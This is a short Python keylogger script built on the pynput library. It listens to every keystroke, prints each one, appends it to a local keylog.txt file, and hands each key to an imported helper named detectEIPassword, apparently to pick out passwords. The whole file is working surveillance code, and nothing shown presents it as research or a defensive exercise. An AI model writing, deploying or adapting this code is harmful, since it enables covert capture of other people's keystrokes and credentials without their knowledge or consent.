#!/bin/python3.10

from credentials import detectEIPassword
from helpKey import translateKey
from pynput.keyboard import Key, Listener

KEYLOG_FILE = "keylog.txt"
buffer = ''
wordFlag = False
word = ''


def printDataConsole(key):
    if key != '':
        print('{0}'.format(key))


def saveInFile(key):
    try:
        file = open(KEYLOG_FILE, "a")
        file.write('{0}'.format(key))
    except:
        # Write a breakline in error
        file.writelines('\n')
    finally:
        file.close()


def readLogs():
    file = open(KEYLOG_FILE, "r")
    for line in file:
        print(line)


def recordKey(key):
    # We translate the Keys
    key = translateKey(key)

    # We print the keys
    printDataConsole(key)

    # We write the keys in the log
    saveInFile(key)

    # We try to find the password
    detectEIPassword(key, buffer, wordFlag, word)


def on_release(key):
    if key == Key.esc:
        # Add a breakline on the file
        file = open(KEYLOG_FILE, "a")
        file.write('\n')
        file.close()
        # Stop listener
        return False


def initKeylogger():
    with Listener(on_press=recordKey, on_release=on_release) as listener:
        listener.join()
        listener.start()
